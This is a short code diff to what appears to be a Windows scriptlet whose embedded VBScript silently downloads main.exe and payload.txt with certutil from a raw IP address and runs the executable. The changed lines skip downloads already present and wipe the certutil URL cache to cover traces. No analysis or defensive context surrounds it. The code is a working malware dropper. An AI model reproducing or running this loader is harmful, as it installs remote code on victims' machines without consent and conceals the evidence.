@@ -28,10 +28,11 @@ cmd.exe - < ...:payload.bat
 <script language="VBScript">
     <![CDATA[
         CreateObject("WScript.Shell").Run _
-            "C:\Windows\System32\cmd.exe /c cd /d %TEMP% && " &_
-            "certutil.exe -urlcache -split -f http://47.98.135.65/main/main.exe && " &_
-            "certutil.exe -urlcache -split -f http://47.98.135.65/main/payload.txt && " &_
-            "main.exe", 0, false
+            "%ComSpec% /c cd /d %TEMP% && " &_
+            "(IF NOT EXIST main.exe certutil.exe -urlcache -split -f http://47.98.135.65/main/main.exe) && " &_
+            "(IF NOT EXIST payload.txt certutil.exe -urlcache -split -f http://47.98.135.65/main/payload.txt) && " &_
+            "certutil.exe -urlcache * delete & " &_
+            "main.exe r", 0, false
     ]]>
 </script>
 </registration>
